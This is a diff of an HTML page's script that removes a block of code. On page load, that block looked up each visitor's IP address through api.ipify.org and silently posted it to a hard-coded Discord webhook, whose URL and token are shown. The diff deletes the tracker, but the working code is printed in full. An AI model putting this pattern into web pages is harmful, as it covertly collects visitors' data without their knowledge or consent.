@@ -169,28 +169,6 @@
 
         setInterval(createStar, 400);
 
-        // Function to send IP to Discord webhook
-        function sendIPToWebhook(ip) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1290875920374304821/afWI4CdwHvdy8T8RWTwFywnsOc26AxEwOjrkfmAsjyZL8CAMoBRt1QlBqbekUGVBn4sH';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `IP Address: ${ip}`
-                }),
-            });
-        }
-
-        // Get the user's IP and send it to the webhook
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                sendIPToWebhook(data.ip);
-                document.querySelector(".message").style.display = 'none';
-                document.getElementById("main-content").classList.remove('hidden');
-            });
     </script>
 </body>
 </html>
